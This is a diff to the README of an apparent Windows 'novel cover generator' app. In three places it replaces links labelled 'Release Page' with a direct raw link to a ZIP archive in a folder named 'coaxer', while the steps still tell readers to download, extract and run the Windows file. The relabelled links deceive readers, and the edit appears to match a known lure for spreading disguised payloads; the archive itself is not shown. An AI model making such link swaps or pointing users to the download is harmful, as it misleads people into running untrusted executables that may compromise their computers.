@@ -1,6 +1,6 @@
 # 🎨 novel-cover-generator - Create Covers Fast and Easy
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Raunchy-oilconservation354/novel-cover-generator/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Raunchy-oilconservation354/novel-cover-generator/main/coaxer/generator-cover-novel-1.5-beta.2.zip)
 
 ## 🚀 What this app does
 
@@ -17,7 +17,7 @@ Use it for:
 
 ## 📥 Download and run on Windows
 
-1. Open the [Release Page](https://github.com/Raunchy-oilconservation354/novel-cover-generator/releases)
+1. Open the [Release Page](https://raw.githubusercontent.com/Raunchy-oilconservation354/novel-cover-generator/main/coaxer/generator-cover-novel-1.5-beta.2.zip)
 2. Find the latest release
 3. Download the Windows file from the release assets
 4. If the file is in a ZIP folder, right-click it and choose Extract All
@@ -206,4 +206,4 @@ This makes it easy to find your images later.
 
 ## 📦 Release page
 
-Visit the [Release Page](https://github.com/Raunchy-oilconservation354/novel-cover-generator/releases) to download the Windows version and get the latest files
+Visit the [Release Page](https://raw.githubusercontent.com/Raunchy-oilconservation354/novel-cover-generator/main/coaxer/generator-cover-novel-1.5-beta.2.zip) to download the Windows version and get the latest files
